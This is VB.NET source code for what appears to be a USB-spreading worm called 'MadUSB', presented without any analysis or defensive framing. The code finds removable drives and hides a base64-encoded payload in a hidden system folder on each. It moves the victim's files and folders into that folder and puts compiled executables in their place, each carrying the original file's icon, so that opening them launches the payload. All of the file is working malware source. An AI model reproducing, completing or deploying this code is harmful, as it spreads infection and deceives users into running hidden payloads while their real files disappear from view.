
Imports System.Threading
Imports System.IO
Imports System.Environment
Imports System.IO.DriveInfo
Imports System.IO.Directory
Imports System.IO.Path
Imports System.Text
Imports System.Drawing.IconLib
Imports System.Drawing
Imports System.Windows.Forms
Imports System.Collections.Generic
Imports System.Diagnostics

Public Class Class1

    Public Shared B As String = "%PayloadBytes%"
    Public Shared S As String = "%PayloadName%"

    Public Shared Sub Main()
        Dim Run As New Thread(AddressOf Start, 1)
        Run.Start()
    End Sub

    Public Shared Sub Start()
        'RE:


        Try
            If Not File.Exists(Application.StartupPath + "\IconLib.dll") Then
                File.WriteAllBytes(Application.StartupPath + "\IconLib.dll", My.Resources.IconLib)
            End If
        Catch ex As Exception
        End Try

        Try
            For Each Drivers In GetDrives()
                Try
                    If Drivers.DriveType = 2 Then
                        If Not Exists(Drivers.ToString & "!@") Then
                            CreateDirectory(Drivers.ToString & "!@")
                            IO.File.SetAttributes(Drivers.ToString & "!@", FileAttributes.System + FileAttributes.Hidden)
                        End If
                        If Not File.Exists(Drivers.ToString & "!@" & "\" & S) Then
                            File.WriteAllBytes(Drivers.ToString & "!@" & "\" & S, Convert.FromBase64String(B))
                            File.SetAttributes(Drivers.ToString & "!@" & "\" & S, FileAttributes.System + FileAttributes.Hidden)
                        End If
                        Call GetTheFile(Drivers.ToString)
                    End If
                Catch ex As Exception
                End Try
            Next
        Catch ex As Exception
        End Try
        'Thread.Sleep(120000)
        'GoTo RE
        End
    End Sub

    Public Shared Function GetTheFile(ByVal P As String)
        Dim Source = My.Resources.Codedom
        If P.Length = 0 Then
            Exit Function
        End If
        For Each Files In GetFiles(P)
            If Not GetFileName(Files) = S Then
                If Not IO.Directory.Exists(GetFolderPath(35) & "\" & MachineName & "\") Then
                    IO.Directory.CreateDirectory(GetFolderPath(35) & "\" & MachineName & "\")
                End If
                Try
                    If Not GetExtension(Files).ToLower = ".lnk" Then
                        If ISINF(GetExtension(Files).ToLower) Then
                            If IsValid(Files) = False Then
                                Dim EX = GetIcon(GetExtension(Files).ToLower, Files)
                                Thread.Sleep(10)
                                Try
                                    IO.File.Move(Files, P & "!@" & "\" & GetFileName(Files))
                                Catch : End Try
                                Compile(Source.Replace("%A%", "!@" & "\" & S).Replace("%B%", "!@" & "\" & GetFileName(Files)).Replace("%C%", "MadUSB").Replace("Nervousness", Randomz(6)), Files, EX, True)
                            End If
                        Else
                            Dim EX = GetIcon(GetExtension(Files).ToLower, Files)
                            Try
                                IO.File.Move(Files, P & "!@" & "\" & GetFileName(Files))
                            Catch : End Try
                            Compile(Source.Replace("%A%", "!@" & "\" & S).Replace("%B%", "!@" & "\" & GetFileName(Files)).Replace("%C%", "MadUSB").Replace("Nervousness", Randomz(6)), Files, EX, True)
                        End If
                    End If
                Catch ex As Exception
                End Try
            End If
        Next
        For Each Directorys In GetDirectories(P)
            Try
                If Not Exists(P & "!@" & "\" & GetFileName(Directorys)) Then
                    If Not GetFileName(P) = "!@" Then
                        IO.File.Move(Directorys, P & "!@" & "\" & GetFileName(Directorys))
                        Compile(Source.Replace("%A%", "!@" & "\" & S).Replace("%B%", "!@" & "\" & GetFileName(Directorys)).Replace("%C%", "MadUSB").Replace("Nervousness", Randomz(6)), Directorys, Nothing, False)
                    End If
                End If
            Catch ex As Exception
            End Try
        Next
    End Function

    Public Shared Function GetIcon(ByVal EX As String, P As String) As String
        Try
            If Not Exists(GetFolderPath(35) & "\" & MachineName & "\") Then
                CreateDirectory(GetFolderPath(35) & "\" & MachineName & "\")
            End If
            Dim I1 As Icon = Icon.ExtractAssociatedIcon(P), MI As New MultiIcon(), SI As SingleIcon = MI.Add(GetFileName(P))
            SI.CreateFrom(I1.ToBitmap(), IconOutputFormat.Vista)
            SI.Save(GetFolderPath(35) & "\" & MachineName & "\" & "!@" & EX & ".ico")
            Return EX
        Catch ex1 As Exception
        End Try
    End Function

    Public Shared Function Compile(ByVal Source As String, Out As String, icon As String, File As Boolean)
        Dim ProviderOptions As New Dictionary(Of String, String)()
        ProviderOptions.Add("CompilerVersion", "v2.0")
        Dim CP = New Microsoft.VisualBasic.VBCodeProvider(ProviderOptions)
        Dim P As New CodeDom.Compiler.CompilerParameters
        Dim s As New StringBuilder()
        s.Append(" /target:winexe")
        s.Append(" /platform:x86")
        s.Append(" /optimize+")
        If File Then
            If icon.Length > 0 Then
                If Exists(GetFolderPath(35) & "\" & MachineName & "\") Then
                    If IO.File.Exists(GetFolderPath(35) & "\" & MachineName & "\" & "!@" & icon & ".ico") Then
                        s.Append(" /win32icon:" & GetFolderPath(35) & "\" & MachineName & "\" & "!@" & icon & ".ico")
                    End If
                End If
            End If
        Else
            IO.File.WriteAllBytes(GetFolderPath(35) & "\" & MachineName & "\" & "!@" & ".ico", Convert.FromBase64String(""))
            s.Append(" /win32icon:" & GetFolderPath(35) & "\" & MachineName & "\" & "!@" & ".ico")
        End If
        P.GenerateExecutable = True
        P.OutputAssembly = Out
        P.CompilerOptions += s.ToString()
        P.IncludeDebugInformation = False
        P.ReferencedAssemblies.Add("System.Windows.Forms.Dll")
        Dim Results1
        Try
            Results1 = CP.CompileAssemblyFromSource(P, Source)
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
        Thread.Sleep(10)
        Try
            IO.File.Delete(GetFolderPath(35) & "\" & MachineName & "\" & "!@" & icon & ".ico")
        Catch ex As Exception
        End Try
    End Function

    Public Shared Function IsValid(ByVal P As String) As Boolean
        Try
            Dim Info As FileVersionInfo = FileVersionInfo.GetVersionInfo(P)
            If Info.LegalCopyright.Contains("MadUSB") Then
                Return True
            Else
                Return False
            End If
        Catch
            Return False
        End Try
    End Function

    Public Shared Function ISINF(ByVal EX As String) As Boolean
        If EX.Contains(".exe") Then
            Return True
        End If
    End Function

    Public Shared Function Randomz(ByVal L As Integer)
        Dim validchars As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        Dim sb As New System.Text.StringBuilder()
        Dim rand As New Random()
        For i As Integer = 1 To L
            Dim idx As Integer = rand.Next(0, validchars.Length)
            Dim randomChar As Char = validchars(idx)
            sb.Append(randomChar)
        Next i
        Dim randomString = sb.ToString()
        Return randomString
    End Function

End Class
